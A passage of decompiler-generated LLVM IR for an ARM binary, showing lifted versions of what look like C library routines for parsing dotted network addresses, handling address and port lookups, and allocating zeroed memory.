  %v3_15210 = zext i8 %v2_15210 to i32
  %v2_15214 = mul nuw nsw i32 %v3_15210, 2
  %v2_15218 = add i32 %v2_15214, %v4_151dc
  %v3_15218 = inttoptr i32 %v2_15218 to i16*
  %v4_15218 = load i16, i16* %v3_15218, align 2
  %v6_15218 = zext i16 %v4_15218 to i32
  %v1_1521c = and i32 %v6_15218, 8
  %v2_1521c = icmp eq i32 %v1_1521c, 0
  br i1 %v2_1521c, label %dec_label_pc_15224, label %dec_label_pc_151f8

dec_label_pc_15224:                               ; preds = %dec_label_pc_15210
  %v7_15224 = icmp eq i32 %v0_15254, 4
  br i1 %v7_15224, label %dec_label_pc_1523c, label %dec_label_pc_1522c

dec_label_pc_1522c:                               ; preds = %dec_label_pc_15224
  %v7_1522c = icmp eq i8 %v2_15210, 46
  br i1 %v7_1522c, label %dec_label_pc_15234, label %dec_label_pc_1528c

dec_label_pc_15234:                               ; preds = %dec_label_pc_1522c
  %v1_15234 = add i32 %v0_15240, 1
  store i32 %v1_15234, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15250

dec_label_pc_1523c:                               ; preds = %dec_label_pc_15224
  %v2_1523c = icmp eq i8 %v2_15210, 0
  %v1_15240 = add i32 %v0_15240, 1
  store i32 %v1_15240, i32* %r0.global-to-local, align 4
  br i1 %v2_1523c, label %dec_label_pc_15250, label %dec_label_pc_15248

dec_label_pc_15248:                               ; preds = %dec_label_pc_1523c
  %v1_15248 = and i32 %v6_15218, 32
  %v2_15248 = icmp eq i32 %v1_15248, 0
  br i1 %v2_15248, label %dec_label_pc_1528c, label %dec_label_pc_15250

dec_label_pc_15250:                               ; preds = %dec_label_pc_15248, %dec_label_pc_1523c, %dec_label_pc_15234
  %v0_151d812 = phi i32 [ %v1_15240, %dec_label_pc_15248 ], [ %v1_15240, %dec_label_pc_1523c ], [ %v1_15234, %dec_label_pc_15234 ]
  %v4_15250 = mul i32 %v1_15250, 256
  %v5_15250 = or i32 %v0_15250, %v4_15250
  %v1_15254 = add nuw nsw i32 %v0_15254, 1
  %v7_1525c = icmp slt i32 %v1_15254, 5
  br i1 %v7_1525c, label %dec_label_pc_151d8, label %dec_label_pc_15260

dec_label_pc_15260:                               ; preds = %dec_label_pc_15250
  %v2_15260 = icmp eq i32 %arg2, 0
  br i1 %v2_15260, label %.thread7.thread, label %bb

.thread7.thread:                                  ; preds = %dec_label_pc_15260
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15290

bb:                                               ; preds = %dec_label_pc_15260
  %v4_15264 = udiv i32 %v5_15250, 16777216
  %v2_15268 = udiv i32 %v5_15250, 256
  %v5_1526c = and i32 %v2_15268, 65280
  %v2_15270 = and i32 %v5_15250, 65280
  %v5_15274 = mul nuw nsw i32 %v2_15270, 256
  %v5_15278 = mul i32 %v0_15250, 16777216
  %v6_1526c = or i32 %v4_15264, %v5_15278
  %v6_15274 = or i32 %v6_1526c, %v5_1526c
  %v6_15278 = or i32 %v6_15274, %v5_15274
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_15284 = inttoptr i32 %arg2 to i32*
  store i32 %v6_15278, i32* %v3_15284, align 4
  %v2_15290.pre = load i32, i32* %stack_var_-28, align 4
  %v1_15294.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15290

dec_label_pc_1528c:                               ; preds = %dec_label_pc_1522c, %dec_label_pc_15248, %dec_label_pc_151d8, %dec_label_pc_151f8, %dec_label_pc_151a8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15290

dec_label_pc_15290:                               ; preds = %.thread7.thread, %bb, %dec_label_pc_1528c
  %v1_15294 = phi i32 [ %v1_15294.pre, %bb ], [ 0, %dec_label_pc_1528c ], [ 1, %.thread7.thread ]
  %v2_15290 = phi i32 [ %v2_15290.pre, %bb ], [ %v3_151a8, %dec_label_pc_1528c ], [ %v3_151a8, %.thread7.thread ]
  store i32 %v2_15290, i32* @r4, align 4
  ret i32 %v1_15294

; uselistorder directives
  uselistorder i32 %v1_15254, { 1, 0 }
  uselistorder i32 %v5_15250, { 2, 0, 1, 3 }
  uselistorder i32 %v0_15240, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 6, 7, 8, 3, 4, 5, 0, 1 }
  uselistorder i32 65280, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_15290, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1528c, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_15210, { 1, 0 }
  uselistorder label %dec_label_pc_151d8, { 1, 0 }
}

define i32 @function_152a0(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_152a0:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %v9_152a0 = load i32, i32* @r6, align 4
  %v12_152a0 = load i32, i32* @r7, align 4
  %v15_152a0 = load i32, i32* @r8, align 4
  %v18_152a0 = load i32, i32* @sb, align 4
  %v21_152a0 = load i32, i32* @sl, align 4
  %v24_152a0 = load i32, i32* @fp, align 4
  %v7_152a4 = icmp eq i32 %arg2, 2
  store i32 %arg2, i32* @r4, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg1, i32* @sb, align 4
  store i32 %arg5, i32* @sl, align 4
  store i32 %arg7, i32* @fp, align 4
  br i1 %v7_152a4, label %dec_label_pc_152c8, label %dec_label_pc_152e8

dec_label_pc_152c8:                               ; preds = %dec_label_pc_152a0
  store i32 %arg6, i32* @ip, align 4
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg4, i32* @r2, align 4
  store i32 %arg5, i32* @r3, align 4
  %v0_152e0 = call i32 @function_17438()
  store i32 %v0_152e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15534

dec_label_pc_152e8:                               ; preds = %dec_label_pc_152a0
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v7_152f0 = icmp eq i32 %arg2, 10
  %v2_152f4 = inttoptr i32 %arg6 to i32*
  store i32 0, i32* %v2_152f4, align 4
  br i1 %v7_152f0, label %dec_label_pc_152fc, label %dec_label_pc_15530

dec_label_pc_152fc:                               ; preds = %dec_label_pc_152e8
  %v1_152fc = load i32, i32* @r7, align 4
  %v9_152fc = icmp eq i32 %v1_152fc, %arg1
  br i1 %v9_152fc, label %dec_label_pc_15530, label %dec_label_pc_15304

dec_label_pc_15304:                               ; preds = %dec_label_pc_152fc
  %v0_15304 = call i32 @function_d0ec()
  store i32 %v0_15304, i32* %r0.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_15304, i32* @r5, align 4
  %v0_15310 = load i32, i32* @r4, align 4
  %v0_15314 = load i32, i32* @r6, align 4
  store i32 %v0_15314, i32* %r2.global-to-local, align 4
  %v1_15318 = inttoptr i32 %v0_15304 to i32*
  %v2_15318 = load i32, i32* %v1_15318, align 4
  store i32 %v2_15318, i32* @r4, align 4
  %v0_1531c = load i32, i32* @r8, align 4
  store i32 %v0_1531c, i32* %r3.global-to-local, align 4
  %v0_15320 = load i32, i32* @r7, align 4
  store i32 %v0_15320, i32* %v1_15318, align 4
  %v0_15324 = load i32, i32* @sb, align 4
  store i32 %v0_15324, i32* %r0.global-to-local, align 4
  %v2_15328 = load i32, i32* @sl, align 4
  %v5_15328 = load i32, i32* %ip.global-to-local, align 4
  %v0_1532c = load i32, i32* @fp, align 4
  %v7_15330 = call i32 @function_173ec(i32 %v0_15324, i32 %v0_15310, i32 %v0_15314, i32 %v0_1531c, i32 %v2_15328, i32 %v5_15328, i32 %v0_1532c)
  store i32 %v7_15330, i32* %r0.global-to-local, align 4
  %v2_15334 = icmp eq i32 %v7_15330, 0
  br i1 %v2_15334, label %bb, label %dec_label_pc_15340

bb:                                               ; preds = %dec_label_pc_15304
  %v1_15338 = load i32, i32* @r4, align 4
  %v2_15338 = load i32, i32* @r5, align 4
  %v3_15338 = inttoptr i32 %v2_15338 to i32*
  store i32 %v1_15338, i32* %v3_15338, align 4
  br label %dec_label_pc_15534

dec_label_pc_15340:                               ; preds = %dec_label_pc_15304
  %v0_15340 = load i32, i32* @fp, align 4
  %v1_15340 = inttoptr i32 %v0_15340 to i32*
  %v2_15340 = load i32, i32* %v1_15340, align 4
  store i32 %v2_15340, i32* %r3.global-to-local, align 4
  %v7_15344 = icmp eq i32 %v2_15340, 1
  br i1 %v7_15344, label %dec_label_pc_15360, label %dec_label_pc_1534c

dec_label_pc_1534c:                               ; preds = %dec_label_pc_15340
  %v7_1534c = icmp eq i32 %v2_15340, 4
  br i1 %v7_1534c, label %dec_label_pc_1537c, label %dec_label_pc_15354

dec_label_pc_15354:                               ; preds = %dec_label_pc_1534c
  %v3_15354 = icmp eq i32 %v2_15340, -1
  br i1 %v3_15354, label %dec_label_pc_15370, label %dec_label_pc_15534

dec_label_pc_15360:                               ; preds = %dec_label_pc_15340
  %v7_15360 = icmp eq i32 %v7_15330, 2
  br i1 %v7_15360, label %.thread1, label %bb29

bb29:                                             ; preds = %dec_label_pc_15360
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_15380

.thread1:                                         ; preds = %dec_label_pc_15360
  store i32 1, i32* @r7, align 4
  br label %dec_label_pc_15380

dec_label_pc_15370:                               ; preds = %dec_label_pc_15354
  %v0_15370 = load i32, i32* @r5, align 4
  %v1_15370 = inttoptr i32 %v0_15370 to i32*
  %v2_15370 = load i32, i32* %v1_15370, align 4
  store i32 %v2_15370, i32* %r3.global-to-local, align 4
  %v7_15374 = icmp eq i32 %v2_15370, 2
  br i1 %v7_15374, label %dec_label_pc_1537c, label %dec_label_pc_15534

dec_label_pc_1537c:                               ; preds = %dec_label_pc_15370, %dec_label_pc_1534c
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_15380

dec_label_pc_15380:                               ; preds = %bb29, %.thread1, %dec_label_pc_1537c
  %v0_15380 = load i32, i32* @r8, align 4
  %v1_15380 = sub i32 0, %v0_15380
  %v1_15384 = urem i32 %v1_15380, 4
  store i32 %v1_15384, i32* %r0.global-to-local, align 4
  %v1_15388 = load i32, i32* @sl, align 4
  %v2_15388 = sub i32 %v1_15388, %v1_15384
  %v1_1538c = add i32 %v2_15388, -24
  store i32 %v1_1538c, i32* @sl, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_15398 = load i32, i32* @r4, align 4
  %v1_15398 = load i32, i32* @r5, align 4
  %v2_15398 = inttoptr i32 %v1_15398 to i32*
  store i32 %v0_15398, i32* %v2_15398, align 4
  %v7_1539c = icmp sgt i32 %v1_1538c, 255
  br i1 %v7_1539c, label %dec_label_pc_153a8, label %bb30

bb30:                                             ; preds = %dec_label_pc_15380
  store i32 34, i32* %r0.global-to-local, align 4
  %v0_153a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_153a0 = load i32, i32* @fp, align 4
  %v2_153a0 = inttoptr i32 %v1_153a0 to i32*
  store i32 %v0_153a0, i32* %v2_153a0, align 4
  br label %dec_label_pc_15534

dec_label_pc_153a8:                               ; preds = %dec_label_pc_15380
  %v0_153a03 = load i32, i32* %r3.global-to-local, align 4
  %v1_153a04 = load i32, i32* @fp, align 4
  %v2_153a05 = inttoptr i32 %v1_153a04 to i32*
  store i32 %v0_153a03, i32* %v2_153a05, align 4
  %v0_153a8 = load i32, i32* @r8, align 4
  %v1_153a8 = load i32, i32* %r0.global-to-local, align 4
  %v2_153a8 = add i32 %v1_153a8, %v0_153a8
  store i32 %v2_153a8, i32* @r8, align 4
  store i32 0, i32* @r4, align 4
  %v1_153b0 = add i32 %v2_153a8, 16
  store i32 %v1_153b0, i32* %r2.global-to-local, align 4
  %v1_153b4 = add i32 %v2_153a8, 24
  store i32 %v1_153b4, i32* @r5, align 4
  %v3_153bc = inttoptr i32 %v1_153b0 to i32*
  store i32 %v2_153a8, i32* %v3_153bc, align 4
  %v0_153c0 = load i32, i32* @sb, align 4
  store i32 %v0_153c0, i32* @r1, align 4
  %v0_153c4 = load i32, i32* @r4, align 4
  %v1_153c4 = load i32, i32* %r2.global-to-local, align 4
  %v2_153c4 = add i32 %v1_153c4, 4
  %v3_153c4 = inttoptr i32 %v2_153c4 to i32*
  store i32 %v0_153c4, i32* %v3_153c4, align 4
  %v0_153c8 = load i32, i32* @r5, align 4
  store i32 %v0_153c8, i32* %r0.global-to-local, align 4
  %v0_153cc = load i32, i32* @sl, align 4
  store i32 %v0_153cc, i32* %r2.global-to-local, align 4
  %v3_153d0 = call i32 @function_f910(i32 %v0_153c8, i32 %v0_153c0, i32 %v0_153cc)
  %v0_153d4 = load i32, i32* @r4, align 4
  %v1_153d4 = trunc i32 %v0_153d4 to i8
  %v2_153d4 = load i32, i32* @r5, align 4
  %v3_153d4 = load i32, i32* @sl, align 4
  %v4_153d4 = add i32 %v3_153d4, %v2_153d4
  %v5_153d4 = inttoptr i32 %v4_153d4 to i8*
  store i8 %v1_153d4, i8* %v5_153d4, align 1
  %v0_153d8 = load i32, i32* @sb, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_153e0 = load i32, i32* @r8, align 4
  store i32 %v0_153e0, i32* %r2.global-to-local, align 4
  %v3_153e4 = inttoptr i32 %v0_153d8 to i8*
  %v4_153e4 = call i32 @function_15f88(i32 10, i8* %v3_153e4, i32 %v0_153e0)
  store i32 %v4_153e4, i32* %r0.global-to-local, align 4
  %v1_153e8 = load i32, i32* @r4, align 4
  %v9_153e8 = icmp eq i32 %v4_153e4, %v1_153e8
  br i1 %v9_153e8, label %dec_label_pc_15420, label %dec_label_pc_153f0

dec_label_pc_153f0:                               ; preds = %dec_label_pc_153a8
  store i32 %v1_153b0, i32* @ip, align 4
  %v0_153f8 = load i32, i32* @r6, align 4
  store i32 %v0_153f8, i32* %v2_152f4, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_15400 = load i32, i32* @r6, align 4
  %v2_15400 = add i32 %v1_15400, 8
  %v3_15400 = inttoptr i32 %v2_15400 to i32*
  store i32 10, i32* %v3_15400, align 4
  %v0_15404 = load i32, i32* @r4, align 4
  store i32 %v0_15404, i32* %r0.global-to-local, align 4
  %v0_15408 = load i32, i32* %r3.global-to-local, align 4
  %v1_15408 = add i32 %v0_15408, 6
  store i32 %v1_15408, i32* %r3.global-to-local, align 4
  %v1_1540c = load i32, i32* @r6, align 4
  %v2_1540c = add i32 %v1_1540c, 12
  %v3_1540c = inttoptr i32 %v2_1540c to i32*
  store i32 %v1_15408, i32* %v3_1540c, align 4
  %v0_15410 = load i32, i32* @r5, align 4
  %v1_15410 = load i32, i32* @r6, align 4
  %v2_15410 = inttoptr i32 %v1_15410 to i32*
  store i32 %v0_15410, i32* %v2_15410, align 4
  %v0_15414 = load i32, i32* @ip, align 4
  %v1_15414 = load i32, i32* @r6, align 4
  %v2_15414 = add i32 %v1_15414, 16
  %v3_15414 = inttoptr i32 %v2_15414 to i32*
  store i32 %v0_15414, i32* %v3_15414, align 4
  %v0_15418 = load i32, i32* @r4, align 4
  %v1_15418 = load i32, i32* @fp, align 4
  %v2_15418 = inttoptr i32 %v1_15418 to i32*
  store i32 %v0_15418, i32* %v2_15418, align 4
  br label %dec_label_pc_15534

dec_label_pc_15420:                               ; preds = %dec_label_pc_153a8
  %v0_15420 = load i32, i32* @r7, align 4
  %v2_15420 = icmp eq i32 %v0_15420, 0
  br i1 %v2_15420, label %dec_label_pc_15428, label %dec_label_pc_15520

dec_label_pc_15428:                               ; preds = %dec_label_pc_15420
  %v2_15428 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_15428, i32* @r4, align 4
  store i32 %v2_15428, i32* %r0.global-to-local, align 4
  store i32 40, i32* @r2, align 4
  %v2_15438 = bitcast i32* %stack_var_-84 to i8*
  %v3_15438 = call i32 @function_f5d0(i8* %v2_15438, i32 0)
  store i32 %v3_15438, i32* %r0.global-to-local, align 4
  %v2_15440 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_15440, i32* @sb, align 4
  %v7_15480 = icmp eq i32 %tmp9, 5
  br label %dec_label_pc_15444

dec_label_pc_15444:                               ; preds = %dec_label_pc_15498, %dec_label_pc_15428
  store i32 %v2_15440, i32* %r2.global-to-local, align 4
  store i32 %v2_15428, i32* %r3.global-to-local, align 4
  %v0_15450 = load i32, i32* @r5, align 4
  store i32 %v0_15450, i32* %r0.global-to-local, align 4
  %v4_15454 = inttoptr i32 %v0_15450 to i8*
  %v5_15454 = call i32 @function_16664(i8* %v4_15454, i32 28, i32 %v2_15440, i32 %v2_15428)
  store i32 %v5_15454, i32* @r4, align 4
  %v1_15458 = icmp slt i32 %v5_15454, 0
  %v0_1545c = load i32, i32* @sl, align 4
  store i32 %v0_1545c, i32* %r2.global-to-local, align 4
  %v0_15460 = load i32, i32* @r7, align 4
  %v1_15460 = add i32 %v0_15460, 1
  store i32 %v1_15460, i32* @r7, align 4
  %v0_15464 = load i32, i32* @r5, align 4
  store i32 %v0_15464, i32* %r0.global-to-local, align 4
  br i1 %v1_15458, label %dec_label_pc_15520, label %dec_label_pc_1546c

dec_label_pc_1546c:                               ; preds = %dec_label_pc_15444
  %v3_1546c = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1546c, i32* @r1, align 4
  %v3_15470 = call i32 @function_f910(i32 %v0_15464, i32 %v3_1546c, i32 %v0_1545c)
  %v3_15474 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_15474, i32* @r0, align 4
  %v0_15478 = call i32 @function_11048()
  store i32 %v0_15478, i32* %r0.global-to-local, align 4
  %v0_15484 = load i32, i32* @r4, align 4
  store i32 %v0_15484, i32* %r2.global-to-local, align 4
  %v0_15488 = load i32, i32* @r5, align 4
  store i32 %v0_15488, i32* @r3, align 4
  br i1 %v7_15480, label %dec_label_pc_15490, label %dec_label_pc_154c8

dec_label_pc_15490:                               ; preds = %dec_label_pc_1546c
  %v0_15490 = load i32, i32* @r7, align 4
  %v8_15494 = icmp sgt i32 %v0_15490, 5
  br i1 %v8_15494, label %dec_label_pc_154bc, label %dec_label_pc_15498

dec_label_pc_15498:                               ; preds = %dec_label_pc_15490
  store i32 %tmp8, i32* @r1, align 4
  %v3_1549c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1549c, i32* %r0.global-to-local, align 4
  %v0_154a0 = load i32, i32* @sl, align 4
  %v5_154a4 = call i32 @function_1656c(i32 %v3_1549c, i32 %tmp8, i32 %v0_15484, i32 %v0_15488, i32 %v0_154a0)
  store i32 %v5_154a4, i32* @r4, align 4
  %v3_154ac = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_154ac, i32* @r0, align 4
  %v0_154b0 = call i32 @function_11048()
  store i32 %v0_154b0, i32* %r0.global-to-local, align 4
  %v0_154b4 = load i32, i32* @r4, align 4
  %v1_154b4 = icmp slt i32 %v0_154b4, 0
  br i1 %v1_154b4, label %dec_label_pc_154bc, label %dec_label_pc_15444

dec_label_pc_154bc:                               ; preds = %dec_label_pc_15498, %dec_label_pc_15490
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15528

dec_label_pc_154c8:                               ; preds = %dec_label_pc_1546c
  %v7_154c8 = icmp eq i32 %tmp9, 28
  br i1 %v7_154c8, label %dec_label_pc_154d0, label %dec_label_pc_15518

dec_label_pc_154d0:                               ; preds = %dec_label_pc_154c8
  store i32 16, i32* @r2, align 4
  %v0_154d8 = load i32, i32* @r8, align 4
  store i32 %v0_154d8, i32* @r0, align 4
  %v0_154dc = call i32 @function_f700()
  store i32 10, i32* %r3.global-to-local, align 4
  store i32 %v1_153b0, i32* %r2.global-to-local, align 4
  %v1_154e8 = load i32, i32* @r6, align 4
  %v2_154e8 = add i32 %v1_154e8, 8
  %v3_154e8 = inttoptr i32 %v2_154e8 to i32*
  store i32 10, i32* %v3_154e8, align 4
  %v0_154ec = load i32, i32* %r3.global-to-local, align 4
  %v1_154ec = add i32 %v0_154ec, 6
  store i32 %v1_154ec, i32* %r3.global-to-local, align 4
  %v1_154f0 = load i32, i32* @r6, align 4
  %v2_154f0 = add i32 %v1_154f0, 12
  %v3_154f0 = inttoptr i32 %v2_154f0 to i32*
  store i32 %v1_154ec, i32* %v3_154f0, align 4
  %v3_154f4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_154f4, i32* @r0, align 4
  %v0_154f8 = load i32, i32* @r5, align 4
  %v1_154f8 = load i32, i32* @r6, align 4
  %v2_154f8 = inttoptr i32 %v1_154f8 to i32*
  store i32 %v0_154f8, i32* %v2_154f8, align 4
  %v0_154fc = load i32, i32* %r2.global-to-local, align 4
  %v1_154fc = load i32, i32* @r6, align 4
  %v2_154fc = add i32 %v1_154fc, 16
  %v3_154fc = inttoptr i32 %v2_154fc to i32*
  store i32 %v0_154fc, i32* %v3_154fc, align 4
  %v0_15500 = call i32 @function_11048()
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_15510 = load i32, i32* @r6, align 4
  store i32 %v0_15510, i32* %v2_152f4, align 4
  %v0_15528.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15528

dec_label_pc_15518:                               ; preds = %dec_label_pc_154c8
  %v3_15518 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_15518, i32* @r0, align 4
  %v0_1551c = call i32 @function_11048()
  store i32 %v0_1551c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15520

dec_label_pc_15520:                               ; preds = %dec_label_pc_15444, %dec_label_pc_15420, %dec_label_pc_15518
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15528

dec_label_pc_15528:                               ; preds = %dec_label_pc_154d0, %dec_label_pc_154bc, %dec_label_pc_15520
  %v0_15528 = phi i32 [ %v0_15528.pre, %dec_label_pc_154d0 ], [ 3, %dec_label_pc_154bc ], [ 1, %dec_label_pc_15520 ]
  %v1_15528 = load i32, i32* @fp, align 4
  %v2_15528 = inttoptr i32 %v1_15528 to i32*
  store i32 %v0_15528, i32* %v2_15528, align 4
  br label %dec_label_pc_15534

dec_label_pc_15530:                               ; preds = %dec_label_pc_152e8, %dec_label_pc_152fc
  store i32 22, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15534

dec_label_pc_15534:                               ; preds = %bb, %bb30, %dec_label_pc_15370, %dec_label_pc_15354, %dec_label_pc_15528, %dec_label_pc_153f0, %dec_label_pc_152c8, %dec_label_pc_15530
  store i32 %v9_152a0, i32* @r6, align 4
  store i32 %v12_152a0, i32* @r7, align 4
  store i32 %v15_152a0, i32* @r8, align 4
  store i32 %v18_152a0, i32* @sb, align 4
  store i32 %v21_152a0, i32* @sl, align 4
  store i32 %v24_152a0, i32* @fp, align 4
  %v1_1553c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1553c

; uselistorder directives
  uselistorder i32 %v2_15428, { 1, 0, 2, 3 }
  uselistorder i32 %v1_153b0, { 2, 1, 0, 3 }
  uselistorder i32 %v1_15384, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 2, 0, 3 }
  uselistorder i32 %tmp8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 4, 2, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 17, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 14, 12, 13, 23, 15, 16, 19, 18, 20, 0, 21, 22, 1 }
  uselistorder i32 (i32, i32, i32)* @function_f910, { 1, 0, 3, 2 }
  uselistorder i32 -24, { 1, 0 }
  uselistorder i32 %arg6, { 4, 3, 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15534, { 7, 4, 5, 1, 2, 3, 0, 6 }
  uselistorder label %dec_label_pc_15530, { 1, 0 }
  uselistorder label %dec_label_pc_15528, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15520, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15380, { 2, 1, 0 }
}

define i32 @function_15540(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15540:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_15540 = load i32, i32* @r4, align 4
  %v6_15540 = load i32, i32* @r5, align 4
  %v9_15540 = load i32, i32* @r6, align 4
  %v12_15540 = load i32, i32* @lr, align 4
  %v2_15548 = icmp eq i32 %arg1, 0
  store i32 142964, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_15558 = mul i32 %arg2, %arg1
  store i32 %v2_15558, i32* @r6, align 4
  br i1 %v2_15548, label %dec_label_pc_15588, label %dec_label_pc_15560

dec_label_pc_15560:                               ; preds = %dec_label_pc_15540
  store i32 %arg1, i32* @r1, align 4
  store i32 %v2_15558, i32* @r0, align 4
  %v0_15568 = call i32 @function_cb30()
  %v0_1556c = load i32, i32* @r4, align 4
  %v9_1556c = icmp eq i32 %v0_1556c, %v0_15568
  br i1 %v9_1556c, label %dec_label_pc_15560.dec_label_pc_15588_crit_edge, label %dec_label_pc_15574

dec_label_pc_15560.dec_label_pc_15588_crit_edge:  ; preds = %dec_label_pc_15560
  %v0_1558c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15588

dec_label_pc_15574:                               ; preds = %dec_label_pc_15560
  %v0_15574 = call i32 @function_d0ec()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_15580 = inttoptr i32 %v0_15574 to i32*
  store i32 12, i32* %v2_15580, align 4
  br label %dec_label_pc_1564c

dec_label_pc_15588:                               ; preds = %dec_label_pc_15560.dec_label_pc_15588_crit_edge, %dec_label_pc_15540
  %v0_155a4 = phi i32 [ %v0_1558c.pre, %dec_label_pc_15560.dec_label_pc_15588_crit_edge ], [ 142964, %dec_label_pc_15540 ]
  %v2_1558c = add i32 %v0_155a4, 72
  %v3_1558c = inttoptr i32 %v2_1558c to i32*
  %v4_1558c = load i32, i32* %v3_1558c, align 4
  store i32 %v4_1558c, i32* @r4, align 4
  %v2_155a4 = add i32 %v0_155a4, 76
  %v3_155a4 = inttoptr i32 %v2_155a4 to i32*
  %v4_155a4 = load i32, i32* %v3_155a4, align 4
  store i32 %v4_155a4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_155a4)
  %v0_155b8 = load i32, i32* @r5, align 4
  %v2_155b8 = add i32 %v0_155b8, 16
  %v3_155b8 = inttoptr i32 %v2_155b8 to i32*
  %v4_155b8 = load i32, i32* %v3_155b8, align 4
  store i32 %v4_155b8, i32* %ip.global-to-local, align 4
  store i32 87492, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_155b8)
  %v0_155c4 = load i32, i32* @r6, align 4
  %v1_155c8 = call i32 @function_10110(i32 %v0_155c4)
  store i32 %v1_155c8, i32* %r4.global-to-local, align 4
  %v2_155cc = icmp eq i32 %v1_155c8, 0
  br i1 %v2_155cc, label %.thread, label %dec_label_pc_155d4

dec_label_pc_155d4:                               ; preds = %dec_label_pc_15588
  %v1_155d4 = add i32 %v1_155c8, -4
  %v2_155d4 = inttoptr i32 %v1_155d4 to i32*
  %v3_155d4 = load i32, i32* %v2_155d4, align 4
  %v1_155d8 = and i32 %v3_155d4, 2
  %v2_155d8 = icmp eq i32 %v1_155d8, 0
  br i1 %v2_155d8, label %dec_label_pc_155e0, label %.thread

dec_label_pc_155e0:                               ; preds = %dec_label_pc_155d4
  %v1_155e07 = add i32 %v3_155d4, -4
  %v1_155e4 = and i32 %v1_155e07, -4
  store i32 %v1_155e4, i32* @r2, align 4
  %v3_155e8 = udiv i32 %v1_155e4, 4
  store i32 %v3_155e8, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_155e4, 36
  %v2_155f0 = icmp ult i32 %v1_155e4, 33
  %v3_155f0 = or i1 %tmp, %v2_155f0
  br i1 %v3_155f0, label %dec_label_pc_155fc, label %dec_label_pc_155f4

dec_label_pc_155f4:                               ; preds = %dec_label_pc_155e0
  %v2_155f4 = inttoptr i32 %v1_155c8 to i8*
  %v3_155f4 = call i32 @function_f5d0(i8* %v2_155f4, i32 0)
  br label %.thread

dec_label_pc_155fc:                               ; preds = %dec_label_pc_155e0
  %tmp8 = icmp eq i32 %v1_155e4, 16
  %v2_15600 = inttoptr i32 %v1_155c8 to i32*
  store i32 0, i32* %v2_15600, align 4
  %v1_15604 = load i32, i32* %r4.global-to-local, align 4
  %v2_15604 = add i32 %v1_15604, 4
  %v3_15604 = inttoptr i32 %v2_15604 to i32*
  store i32 0, i32* %v3_15604, align 4
  %v1_15608 = load i32, i32* %r4.global-to-local, align 4
  %v2_15608 = add i32 %v1_15608, 8
  %v3_15608 = inttoptr i32 %v2_15608 to i32*
  store i32 0, i32* %v3_15608, align 4
  %v2_1560c = icmp ult i32 %v1_155e4, 13
